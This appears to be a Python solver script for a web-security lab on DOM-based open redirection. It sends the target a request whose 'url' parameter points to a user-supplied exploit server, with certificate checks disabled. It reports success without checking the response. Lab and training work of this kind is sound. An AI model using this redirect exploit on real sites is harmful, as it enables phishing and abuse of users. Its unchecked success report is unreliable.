import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "DOM-based open redirection"

def run(url, payload, proxies=None):
    url = url.rstrip('/')
    
    user_input = input("[?] Enter the exploit server URL: ").strip()
    string = f"'{user_input}'"

    vulnerable_url = f"{url}/post?postId=1&url={user_input}"

    try:
        r = requests.get(vulnerable_url, verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
